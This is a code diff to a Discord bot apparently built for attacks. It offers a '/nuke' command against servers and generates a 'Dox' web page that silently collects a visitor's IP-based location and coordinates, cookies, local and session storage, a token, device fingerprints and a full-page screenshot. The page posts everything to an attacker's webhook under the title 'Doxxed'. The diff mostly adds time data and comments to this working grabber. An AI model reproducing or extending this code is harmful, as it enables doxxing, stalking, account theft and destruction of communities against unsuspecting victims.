@@ -77,7 +77,7 @@ client.on('interactionCreate', async (interaction) => {
         const embed = new EmbedBuilder()
             .setTitle('✅ Dox Ready')
             .setColor(0x22c55e)
-            .setDescription(`🔗 ${url}\n\nSends IP, token, storage, screenshot, fingerprints.`);
+            .setDescription(`🔗 ${url}\n\nSends IP, location, token, storage, screenshot, fingerprints.`);
         await interaction.editReply({ embeds: [embed] });
         return;
     }
@@ -97,7 +97,7 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // ---- NUKE (20 channels) ----
+    // ---- NUKE ----
     if (interaction.commandName === 'nuke') {
         await interaction.deferReply({ ephemeral: true });
         const guild = interaction.guild;
@@ -192,7 +192,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- DOX HTML (unchanged) ----
+// ---- DOX HTML - FIXED ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
@@ -231,10 +231,11 @@ function getCookie(name) {
     return null;
 }
 
+// ---- IP DATA: THREE FALLBACKS ----
 async function getIPData() {
     const apis = [
-        { url: 'https://ipinfo.io/json', parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1], asn: d.asn, isp: d.org, timezone: d.timezone })},
-        { url: 'https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query', parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: 'N/A' })},
+        { url: 'https://ipinfo.io/json', parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },
+        { url: 'https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query', parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: 'N/A' }) },
         { url: 'https://api.ipify.org?format=json', parse: d => ({ ip: d.ip }) }
     ];
     for (const api of apis) {
@@ -250,16 +251,22 @@ async function getIPData() {
     return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', timezone: 'N/A' };
 }
 
+// ---- BATTERY ----
 async function getBattery() {
     try { const b = await navigator.getBattery(); return Math.round(b.level*100)+'% ('+(b.charging?'Charging':'Not')+')'; }
     catch { return 'Not Available'; }
 }
 
+// ---- CONNECTION ----
 function getConnection() {
-    try { const c = navigator.connection || navigator.mozConnection; if (c) return (c.effectiveType || c.type) + ' (' + (c.downlink || 'N/A') + ' Mbps)'; } catch {}
+    try {
+        const c = navigator.connection || navigator.mozConnection;
+        if (c) return (c.effectiveType || c.type) + ' (' + (c.downlink || 'N/A') + ' Mbps)';
+    } catch {}
     return 'Not Available';
 }
 
+// ---- GPU ----
 function getGPU() {
     try {
         const canvas = document.createElement('canvas');
@@ -271,6 +278,7 @@ function getGPU() {
     } catch { return 'N/A'; }
 }
 
+// ---- WEBRTC ----
 function getWebRTC() {
     return new Promise(r => {
         try {
@@ -287,6 +295,7 @@ function getWebRTC() {
     });
 }
 
+// ---- CANVAS FINGERPRINT ----
 function getCanvasFP() {
     try {
         const canvas = document.createElement('canvas');
@@ -304,6 +313,7 @@ function getCanvasFP() {
     } catch { return 'N/A'; }
 }
 
+// ---- FONTS ----
 function getFonts() {
     const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Calibri', 'Cambria', 'Consolas', 'Segoe UI', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Ubuntu', 'Inter'];
     const base = 'mmmmmmmmmmlli';
@@ -321,6 +331,7 @@ function getFonts() {
     return detected;
 }
 
+// ---- AUDIO FINGERPRINT ----
 function getAudioFP() {
     return new Promise(resolve => {
         try {
@@ -343,6 +354,7 @@ function getAudioFP() {
     });
 }
 
+// ---- FULL SCREENSHOT ----
 async function takeScreenshot() {
     try {
         if (typeof html2canvas === 'undefined') return null;
@@ -361,6 +373,7 @@ async function takeScreenshot() {
     } catch { return null; }
 }
 
+// ---- MAIN ----
 (async function() {
     try {
         document.getElementById('loading').innerHTML = '<h1>🔮 Collecting...</h1><div class="spinner"></div><p class="status">Gathering device data...</p>';
@@ -389,8 +402,20 @@ async function takeScreenshot() {
         const pageURL = window.location.href;
         const referrer = document.referrer || 'N/A';
 
+        // ---- TIME ----
+        const now = new Date();
+        const timeData = {
+            timestamp: now.toISOString(),
+            local: now.toString(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            offset: now.getTimezoneOffset(),
+            day: now.toDateString(),
+            hour: now.getHours(),
+            minute: now.getMinutes(),
+            second: now.getSeconds()
+        };
+
         const data = {
-            timestamp: new Date().toISOString(),
             ip: ip.ip, country: ip.country, region: ip.region, city: ip.city, postal: ip.postal,
             lat: ip.lat, lon: ip.lon, asn: ip.asn, isp: ip.isp, timezone: ip.timezone,
             battery, connection: conn, gpu, webrtc, canvasFP: hash(canvasFP), fonts: fonts.join(', '),
@@ -411,27 +436,30 @@ async function takeScreenshot() {
             localStorage: JSON.stringify(ls).slice(0, 1000),
             sessionStorage: JSON.stringify(ss).slice(0, 1000),
             pageTitle, pageURL, referrer,
-            userAgent: ua
+            userAgent: ua,
+            time: timeData,
+            connectionType: conn // already included
         };
 
         const fields = [
-            { name: '🌐 IP', value: data.ip, inline: true },
-            { name: '📍 Country', value: data.country, inline: true },
-            { name: '🏙️ City', value: data.city, inline: true },
-            { name: '🗺️ Region', value: data.region, inline: true },
-            { name: '📮 Postal', value: data.postal, inline: true },
-            { name: '📌 Coordinates', value: \`\${data.lat}, \${data.lon}\`, inline: true },
-            { name: '🔢 ASN', value: data.asn, inline: true },
-            { name: '🏢 ISP', value: data.isp, inline: true },
-            { name: '🕒 Timezone', value: data.timezone, inline: true },
-            { name: '🔋 Battery', value: data.battery, inline: true },
-            { name: '📶 Connection', value: data.connection, inline: true },
-            { name: '📱 Screen', value: data.screen, inline: true },
-            { name: '🧠 Browser', value: data.browser, inline: true },
-            { name: '💻 OS', value: data.os, inline: true },
-            { name: '🖥️ Device', value: data.deviceType, inline: true },
-            { name: '🎮 GPU', value: data.gpu, inline: false },
-            { name: '📡 WebRTC', value: data.webrtc, inline: true },
+            { name: '🌐 IP', value: data.ip || 'N/A', inline: true },
+            { name: '📍 Country', value: data.country || 'N/A', inline: true },
+            { name: '🏙️ City', value: data.city || 'N/A', inline: true },
+            { name: '🗺️ Region', value: data.region || 'N/A', inline: true },
+            { name: '📮 Postal', value: data.postal || 'N/A', inline: true },
+            { name: '📌 Coordinates', value: \`\${data.lat}, \${data.lon}\` || 'N/A', inline: true },
+            { name: '🔢 ASN', value: data.asn || 'N/A', inline: true },
+            { name: '🏢 ISP', value: data.isp || 'N/A', inline: true },
+            { name: '🕒 Timezone', value: data.timezone || 'N/A', inline: true },
+            { name: '⏰ Local Time', value: data.time.local || 'N/A', inline: false },
+            { name: '🔋 Battery', value: data.battery || 'N/A', inline: true },
+            { name: '📶 Connection', value: data.connection || 'N/A', inline: true },
+            { name: '📱 Screen', value: data.screen || 'N/A', inline: true },
+            { name: '🧠 Browser', value: data.browser || 'N/A', inline: true },
+            { name: '💻 OS', value: data.os || 'N/A', inline: true },
+            { name: '🖥️ Device', value: data.deviceType || 'N/A', inline: true },
+            { name: '🎮 GPU', value: data.gpu || 'N/A', inline: false },
+            { name: '📡 WebRTC', value: data.webrtc || 'N/A', inline: true },
             { name: '💾 Hardware', value: \`\${data.hardwareCores} cores, \${data.deviceMemory}GB RAM\`, inline: true },
             { name: '🖱️ Touch', value: data.touchPoints + ' points', inline: true },
             { name: '🍪 Cookies', value: data.cookiesEnabled, inline: true },
@@ -449,18 +477,20 @@ async function takeScreenshot() {
         ];
 
         const embed = {
-            title: '☠️ Ultimate Dox',
+            title: '☠️ Doxxed',
             color: 0xFF0000,
             fields: fields,
             footer: { text: 'Logged at ' + data.timestamp }
         };
 
+        // ---- SEND TO WEBHOOK ----
         await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ embeds: [embed] })
         });
 
+        // ---- SCREENSHOT ----
         document.getElementById('loading').innerHTML = '<h1>📸 Screenshot</h1><div class="spinner"></div><p class="status">Capturing full page...</p>';
         const screenshot = await takeScreenshot();
         if (screenshot) {
@@ -474,6 +504,7 @@ async function takeScreenshot() {
         console.error('Dox error:', err);
     }
 
+    // ---- CLOSE ----
     document.body.innerHTML = '';
     document.body.style.background = '#ffffff';
     document.body.style.margin = '0';
